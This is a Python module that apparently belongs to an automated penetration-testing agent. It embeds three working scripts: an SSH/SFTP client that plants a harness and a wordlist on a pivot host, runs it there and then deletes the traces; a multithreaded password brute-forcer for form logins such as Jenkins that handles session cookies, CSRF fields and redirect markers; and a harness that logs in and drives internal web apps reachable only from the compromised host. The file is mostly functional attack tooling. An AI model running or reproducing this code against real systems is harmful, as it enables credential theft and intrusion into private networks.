"""Client + remote scripts for ``nexus.post.pivot_bruteforce``.

Two programs, deliberately separated:

* ``PIVOT_CLIENT_SCRIPT`` runs **inside the sandbox** on the operator's side.
  It owns the SSH connection, uploads the wordlist slice and the remote
  harness over SFTP, streams the run, and removes every artefact afterwards.
* ``PIVOT_REMOTE_SCRIPT`` runs **on the authorised host**, using only the
  standard library, and is the only program that ever touches the pivoted
  service.

Keeping the attack on the target is what keeps the signed scope intact: the
engagement authorises one SSH host, and the internal ``127.0.0.1:8080`` is
reached as a consequence of that authorisation instead of by widening the
external scope to the operator's own loopback.
"""

from __future__ import annotations

#: Client-side driver (sandboxed): argv = host port user password payload json script timeout.
PIVOT_CLIENT_SCRIPT = r'''
import json, sys, uuid

def emit(payload):
    print(json.dumps(payload), flush=True)

def remote_cleanup(client, paths):
    for path in paths:
        try:
            client.exec_command("rm -f %s" % path, timeout=20)
        except Exception:
            pass

def main():
    host, port, user, password, payload_raw, remote_script, command_timeout = sys.argv[1:8]
    config = json.loads(payload_raw)
    try:
        import paramiko
    except Exception as exc:
        emit({"ok": False, "error": "ssh_unavailable", "detail": str(exc)})
        return
    tag = uuid.uuid4().hex[:12]
    remote_script_path = "/tmp/omni-pivot-%s.py" % tag
    remote_wordlist_path = "/tmp/omni-pivot-%s.wl" % tag
    remote_config_path = "/tmp/omni-pivot-%s.json" % tag
    # ``None`` when this invocation carries no wordlist (single-request mode).
    result = {"ok": False, "target": host}
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host,
            port=int(port),
            username=user,
            password=password,
            timeout=20,
            banner_timeout=20,
            auth_timeout=20,
            allow_agent=False,
            look_for_keys=False,
        )
        result["connected"] = True
        sftp = client.open_sftp()
        # The credential attack uploads a wordlist slice; a single request has
        # nothing to upload and leaves no artefact behind.
        if config.get("wordlist_path"):
            sftp.put(config["wordlist_path"], remote_wordlist_path)
        else:
            remote_wordlist_path = None
        with sftp.file(remote_script_path, "w") as handle:
            handle.write(remote_script)
        remote_config = dict(config)
        if remote_wordlist_path:
            remote_config["wordlist_path"] = remote_wordlist_path
        with sftp.file(remote_config_path, "w") as handle:
            handle.write(json.dumps(remote_config))
        sftp.close()
        command = "python3 %s %s" % (remote_script_path, remote_config_path)
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=float(command_timeout))
            out = stdout.read().decode("utf-8", "replace")
            err = stderr.read().decode("utf-8", "replace")
            code = stdout.channel.recv_exit_status()
        finally:
            remote_cleanup(
                client,
                [path for path in (remote_script_path, remote_config_path, remote_wordlist_path) if path],
            )
    except Exception as exc:
        emit({"ok": False, "error": "pivot_transport_failed", "detail": str(exc), "target": host})
        return
    finally:
        if client is not None:
            try:
                client.close()
            except Exception:
                pass

    progress_path = config.get("progress_path")
    if progress_path and err.strip():
        try:
            with open(progress_path, "a", encoding="utf-8") as handle:
                handle.write(err)
        except OSError:
            pass

    payload = None
    for line in reversed((out or "").strip().splitlines()):
        candidate = line.strip()
        if not candidate.startswith("{"):
            continue
        try:
            payload = json.loads(candidate)
        except ValueError:
            continue
        break
    if payload is None:
        emit({
            "ok": False,
            "target": host,
            "error": "remote harness produced no result",
            "exit_status": code,
            "stderr_tail": err[-400:],
        })
        return
    result.update(payload)
    result["ok"] = True
    result["remote_exit_status"] = code
    emit(result)

main()
'''


#: Remote harness (target-side): argv = config json path.
#:
#: A form login is not a stateless credential oracle. Measured on the Internal
#: room's Jenkins (2.250, legacy ACEGI realm): POSTing ``/j_acegi_security_check``
#: with a fresh connection and no session cookie is answered with **403 for every
#: password**, so a harness that opens a new connection per attempt reports
#: "no credential found" while never having tested a single one. The harness
#: therefore mirrors what a browser does:
#:
#: 1. warm up with a GET (following redirects) to obtain the session cookie and
#:    the form's hidden fields — which is also how a CSRF token gets picked up,
#: 2. keep the session cookie for every attempt,
#: 3. match the markers against the body **and** the ``Location`` header, because
#:    a rejected login is often a redirect (``302 -> /loginError``) rather than a
#:    "invalid password" page,
#: 4. refuse to stay silent when the transport itself is rejecting everything.
PIVOT_REMOTE_SCRIPT = r'''
import http.cookiejar, http.client, json, queue, random, re, string, sys, threading, time
import urllib.error, urllib.parse, urllib.request

HIDDEN_INPUT_RE = re.compile(r"<input[^>]*type\s*=\s*[\"']hidden[\"'][^>]*>", re.I)
ATTR_RE = re.compile(r"([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*[\"']([^\"']*)[\"']")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_hidden_fields(html):
    fields = {}
    for tag in HIDDEN_INPUT_RE.findall(html or ""):
        attributes = {key.lower(): value for key, value in ATTR_RE.findall(tag)}
        name = attributes.get("name")
        if name and name not in fields:
            fields[name] = attributes.get("value", "")
    return fields


def warm_up(config):
    """GET the entry point, following redirects, to collect cookies + hidden fields."""
    url = config.get("session_url") or config["form_url"]
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        response = opener.open(urllib.request.Request(url, headers={"User-Agent": "omni-agentcs/pivot"}), timeout=15)
        body = response.read(65536).decode("utf-8", "replace")
        status = response.status
        landed = response.geturl()
    except urllib.error.HTTPError as exc:
        body = exc.read(65536).decode("utf-8", "replace") if hasattr(exc, "read") else ""
        status = exc.code
        landed = getattr(exc, "url", url)
    except Exception as exc:
        return {"ok": False, "detail": str(exc), "cookie": "", "hidden": {}}
    cookie = "; ".join("%s=%s" % (item.name, item.value) for item in jar)
    return {
        "ok": True,
        "status": status,
        "landed_on": landed,
        "cookie": cookie,
        "hidden": parse_hidden_fields(body),
    }


def fields_for(config, session, password):
    fields = dict(session.get("hidden") or {})
    fields.update(config.get("extra_fields") or {})
    fields[config.get("user_field") or "j_username"] = config["form_username"]
    fields[config.get("pass_field") or "j_password"] = password
    return fields


def attempt(config, session, password, timeout=15):
    """One credential, one request. Returns (status, match_text)."""
    parsed = urllib.parse.urlsplit(config["form_url"])
    target = parsed.path or "/"
    if parsed.query:
        target = target + "?" + parsed.query
    body = urllib.parse.urlencode(fields_for(config, session, password))
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "omni-agentcs/pivot",
        "Accept": "text/html,*/*",
    }
    cookie = session.get("cookie")
    if cookie:
        headers["Cookie"] = cookie
    if parsed.scheme == "https":
        import ssl
        context = ssl._create_unverified_context()
        connection = http.client.HTTPSConnection(
            parsed.hostname, parsed.port or 443, timeout=timeout, context=context
        )
    else:
        connection = http.client.HTTPConnection(
            parsed.hostname, parsed.port or 80, timeout=timeout
        )
    try:
        connection.request("POST", target, body, headers)
        response = connection.getresponse()
        raw = response.read(65536).decode("utf-8", "replace")
        location = response.getheader("Location") or ""
        # The redirect target is part of the answer: ``302 -> /loginError`` is a
        # rejection that carries no marker in the body.
        return response.status, raw + "\n" + location
    finally:
        connection.close()


def accepted(config, status, match_text):
    failure = config.get("failure_marker") or ""
    if failure and failure in match_text:
        return False
    marker = config.get("success_marker") or ""
    if marker:
        return marker in match_text
    return status in (200, 301, 302, 303)


def main():
    config = json.load(open(sys.argv[1], encoding="utf-8"))
    result = {"form_url": config["form_url"], "errors": []}
    started = time.time()

    session = warm_up(config)
    result["session"] = {
        "ok": session["ok"],
        "status": session.get("status"),
        "landed_on": session.get("landed_on"),
        "cookies": bool(session.get("cookie")),
        "hidden_fields": sorted((session.get("hidden") or {}).keys()),
    }
    if not session["ok"]:
        result["errors"].append("session warm-up failed: %s" % session.get("detail"))
        result["elapsed_seconds"] = round(time.time() - started, 1)
        print(json.dumps(result))
        return

    # Preflight: an impossible credential must be REJECTED. Without this a
    # marker that never appears on this build would make every attempt look like
    # a hit (the WordPress batching lesson, applied to form logins).
    probe = "omni-" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
    try:
        status, match_text = attempt(config, session, probe)
    except Exception as exc:
        result["preflight"] = {"ok": False, "detail": "probe failed: %s" % exc}
        result["errors"].append("preflight transport failure")
        result["elapsed_seconds"] = round(time.time() - started, 1)
        print(json.dumps(result))
        return
    if accepted(config, status, match_text):
        result["preflight"] = {
            "ok": False,
            "status": status,
            "detail": "a random password was accepted: failure_marker does not describe this form",
        }
        result["elapsed_seconds"] = round(time.time() - started, 1)
        print(json.dumps(result))
        return
    result["preflight"] = {"ok": True, "status": status, "probe_rejected": True}

    passwords = [
        line.strip()
        for line in open(config["wordlist_path"], encoding="utf-8", errors="replace")
        if line.strip()
    ]
    total = len(passwords)
    workers = max(1, min(int(config.get("workers") or 10), 40))
    pending = queue.Queue()
    for password in passwords:
        pending.put(password)
    lock = threading.Lock()
    stop = threading.Event()
    counter = {"tested": 0, "errors": 0}
    statuses = {}
    hit = {}

    def worker():
        while not stop.is_set():
            try:
                password = pending.get_nowait()
            except queue.Empty:
                return
            try:
                status, match_text = attempt(config, session, password)
                ok = accepted(config, status, match_text)
                seen = str(status)
            except Exception:
                with lock:
                    counter["errors"] += 1
                continue
            with lock:
                counter["tested"] += 1
                statuses[seen] = statuses.get(seen, 0) + 1
                if counter["tested"] % 100 == 0 or ok:
                    sys.stderr.write(json.dumps({
                        "tested": counter["tested"], "total": total,
                        "elapsed_seconds": round(time.time() - started, 1),
                    }) + "\n")
                    sys.stderr.flush()
                if ok and "password" not in hit:
                    hit["password"] = password
                    hit["status"] = status
                    stop.set()
            if ok:
                return

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    result["total"] = total
    result["tested"] = counter["tested"]
    result["errors_count"] = counter["errors"]
    result["statuses"] = statuses
    result.setdefault("errors", [])

    # A single non-2xx status class and no hit means the transport rejected
    # everything (CSRF, missing cookies, wrong host): say so instead of leaving
    # the operator with a "not found" that hides an untested sweep.
    if not hit and statuses and len(statuses) == 1 and int(next(iter(statuses))) >= 400:
        result["errors"].append(
            "every attempt returned HTTP %s: the request was rejected before "
            "reaching the credential check" % next(iter(statuses))
        )

    # Never report a hit from a single observation: re-run it against a fresh
    # connection and require that a different password still fails.
    if hit:
        try:
            status, match_text = attempt(config, session, hit["password"])
            confirm_ok = accepted(config, status, match_text)
            control_status, control_text = attempt(config, session, probe)
            control_ok = accepted(config, control_status, control_text)
            result["verification"] = {
                "ok": bool(confirm_ok) and not bool(control_ok),
                "status": status,
                "control_status": control_status,
                "attempts": 2,
            }
            if confirm_ok and not control_ok:
                result["password"] = hit["password"]
        except Exception as exc:
            result["verification"] = {"ok": False, "detail": str(exc)}

    elapsed = round(time.time() - started, 1)
    result["elapsed_seconds"] = elapsed
    result["rate_per_second"] = round(counter["tested"] / elapsed, 1) if elapsed else None
    print(json.dumps(result))

main()
'''


#: Remote single-request harness (target-side): argv = config json path.
#:
#: Same session model as the brute-force harness (warm-up → cookie → hidden
#: fields), extended with an optional login step and a CSRF/token fetch, so an
#: operator can drive an internal web application that is only reachable from
#: the compromised host. The harness only *observes*: the deterministic
#: post-condition is evaluated by the handler.
PIVOT_HTTP_REMOTE_SCRIPT = r'''
import http.client, json, re, sys, urllib.error, urllib.parse, urllib.request

HIDDEN_INPUT_RE = re.compile(r"<input[^>]*type\s*=\s*[\"']hidden[\"'][^>]*>", re.I)
ATTR_RE = re.compile(r"([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*[\"']([^\"']*)[\"']")


def parse_hidden_fields(html):
    fields = {}
    for tag in HIDDEN_INPUT_RE.findall(html or ""):
        attributes = {key.lower(): value for key, value in ATTR_RE.findall(tag)}
        name = attributes.get("name")
        if name and name not in fields:
            fields[name] = attributes.get("value", "")
    return fields


def cookie_header(session):
    return "; ".join("%s=%s" % (name, value) for name, value in (session.get("cookies") or {}).items())


def store_cookies(session, response):
    """Follow Set-Cookie, like a browser.

    Jenkins (and any Spring Security app) rotates the session id on a
    successful login, so a client that keeps the *warm-up* cookie talks to the
    anonymous session afterwards and every authenticated call fails with
    "No valid crumb was included in the request".
    """
    try:
        raw = response.headers.get_all("Set-Cookie") or []
    except Exception:
        raw = []
    if not raw:
        single = response.headers.get("Set-Cookie")
        raw = [single] if single else []
    for item in raw:
        pair = item.split(";", 1)[0].strip()
        if "=" not in pair:
            continue
        name, value = pair.split("=", 1)
        name = name.strip()
        if name:
            session["cookies"][name] = value.strip()


def fetch(session, url, timeout=15):
    request = urllib.request.Request(url, headers={"User-Agent": "omni-agentcs/pivot"})
    cookie = cookie_header(session)
    if cookie:
        request.add_header("Cookie", cookie)
    try:
        response = urllib.request.urlopen(request, timeout=timeout)
        store_cookies(session, response)
        return response.status, response.read(65536).decode("utf-8", "replace"), response.geturl()
    except urllib.error.HTTPError as exc:
        store_cookies(session, exc)
        body = exc.read(65536).decode("utf-8", "replace") if hasattr(exc, "read") else ""
        return exc.code, body, getattr(exc, "url", url)


def warm_up(config, session):
    url = config.get("session_url") or config.get("login_url") or config["url"]
    try:
        status, body, landed = fetch(session, url)
    except Exception as exc:
        return {"ok": False, "detail": str(exc)}
    session["hidden"] = parse_hidden_fields(body)
    return {"ok": True, "status": status, "landed_on": landed,
            "cookies": bool(cookie_header(session))}


def post(config, session, url, fields, extra_headers=None):
    parsed = urllib.parse.urlsplit(url)
    target = parsed.path or "/"
    if parsed.query:
        target = target + "?" + parsed.query
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "omni-agentcs/pivot",
        "Accept": "text/html,*/*",
    }
    headers.update(extra_headers or {})
    cookie = cookie_header(session)
    if cookie:
        headers["Cookie"] = cookie
    body = urllib.parse.urlencode(fields)
    if parsed.scheme == "https":
        import ssl
        connection = http.client.HTTPSConnection(parsed.hostname, parsed.port or 443, timeout=20,
                                                 context=ssl._create_unverified_context())
    else:
        connection = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=20)
    try:
        connection.request("POST", target, body, headers)
        response = connection.getresponse()
        store_cookies(session, response)
        raw = response.read(262144).decode("utf-8", "replace")
        return response.status, response.getheader("Location") or "", raw
    finally:
        connection.close()


def login(config, session):
    fields = dict(session.get("hidden") or {})
    fields.update(config.get("login_extra_fields") or {})
    fields[config.get("login_user_field") or "j_username"] = config["login_username"]
    fields[config.get("login_password_field") or "j_password"] = config["login_password"]
    status, location, body = post(config, session, config["login_url"], fields)
    marker = config.get("login_failure_marker") or ""
    rejected = bool(marker) and marker in (body + "\n" + location)
    return {"ok": not rejected, "status": status, "location": location,
            "rejected": rejected}, body


def token_header(config, session):
    url = config.get("token_url")
    if not url:
        return {}
    status, body, _ = fetch(session, url)
    field = config.get("token_field") or "crumb"
    value = ""
    try:
        payload = json.loads(body)
        value = str(payload.get(field) or "")
    except ValueError:
        value = ""
    if not value:
        return {}
    return {config.get("token_header") or "Jenkins-Crumb": value}


def main():
    config = json.load(open(sys.argv[1], encoding="utf-8"))
    session = {"cookies": {}, "hidden": {}}
    result = {"url": config["url"], "errors": []}

    if config.get("session_url") or config.get("login_url"):
        warmed = warm_up(config, session)
        result["session"] = {key: value for key, value in warmed.items() if key != "detail"}
        if not warmed["ok"]:
            result["errors"].append("session warm-up failed: %s" % warmed.get("detail"))
            print(json.dumps(result))
            return
    if config.get("login_url"):
        try:
            outcome, _body = login(config, session)
        except Exception as exc:
            result["errors"].append("login failed: %s" % exc)
            print(json.dumps(result))
            return
        result["login"] = outcome
        if not outcome["ok"]:
            result["errors"].append("login rejected (status=%s)" % outcome["status"])
            print(json.dumps(result))
            return

    try:
        headers = dict(config.get("headers") or {})
        headers.update(token_header(config, session))
    except Exception as exc:
        result["errors"].append("token fetch failed: %s" % exc)
        headers = dict(config.get("headers") or {})

    method = (config.get("method") or "GET").upper()
    url = config["url"]
    parsed = urllib.parse.urlsplit(url)
    target = parsed.path or "/"
    if parsed.query:
        target = target + "?" + parsed.query
    cookie = cookie_header(session)
    if cookie:
        headers["Cookie"] = cookie
    headers.setdefault("User-Agent", "omni-agentcs/pivot")
    body_bytes = None
    if config.get("body"):
        body_bytes = config["body"].encode("utf-8")
        headers.setdefault(
            "Content-Type",
            config.get("content_type") or "application/x-www-form-urlencoded",
        )
    try:
        if parsed.scheme == "https":
            import ssl
            connection = http.client.HTTPSConnection(
                parsed.hostname, parsed.port or 443, timeout=config.get("request_timeout") or 30,
                context=ssl._create_unverified_context())
        else:
            connection = http.client.HTTPConnection(
                parsed.hostname, parsed.port or 80, timeout=config.get("request_timeout") or 30)
        try:
            connection.request(method, target, body_bytes, headers)
            response = connection.getresponse()
            store_cookies(session, response)
            raw = response.read(262144).decode("utf-8", "replace")
            result.update({
                "status": response.status,
                "location": response.getheader("Location") or "",
                "body": raw[: config.get("max_body_bytes") or 20000],
                "body_length": len(raw),
                "truncated": len(raw) > (config.get("max_body_bytes") or 20000),
            })
        finally:
            connection.close()
    except Exception as exc:
        result["errors"].append("request failed: %s" % exc)
    print(json.dumps(result))

main()
'''


__all__ = [
    "PIVOT_CLIENT_SCRIPT",
    "PIVOT_HTTP_REMOTE_SCRIPT",
    "PIVOT_REMOTE_SCRIPT",
]
